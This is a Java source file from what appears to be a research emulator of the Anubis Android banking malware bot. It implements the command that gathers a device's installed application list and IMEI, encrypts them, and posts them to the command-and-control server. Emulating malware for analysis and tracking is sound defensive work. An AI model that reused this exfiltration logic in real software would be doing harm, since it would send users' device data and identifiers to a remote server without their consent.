/*
 * Copyright (C) 2020 Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package anubis.commands;

import bot.network.Connector;
import anubis.bot.AnubisBot;
import java.util.Set;

/**
 * This class handles the command to obtain all installed applications on the
 * device
 *
 * @author Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 */
public class GetAllInstalledApplications {

    /**
     * Handles the command to upload all the package names of the installed
     * applications to the C2
     *
     * @param bot the bot
     * @throws Exception if the HTTP request fails
     */
    public GetAllInstalledApplications(AnubisBot bot) throws Exception {
        String log = "Received command to provide all installed applications, which are:\n";

        String result = "All Installed Applications:\n";
        Set<String> installedApplications = bot.getPhone().getInstalledApplications();
        for (String application : installedApplications) {
            result = result + application + "\n";
            log += "\t" + application + "\n";
        }
        log = log.substring(0, log.length() - 1);
        bot.addLog(log);

        String url = bot.getServer() + "/" + bot.getServerFolder() + "/a6.php";
        Connector connector = bot.getConnector();
        String parameter = "p=" + bot.getEncryptionHandler().encrypt(bot.getPhone().getImei() + "|" + result + "|");
        connector.post(url, parameter);

        log = "Responded to the server with a list of all installed applications";
        bot.addLog(log);
    }
}
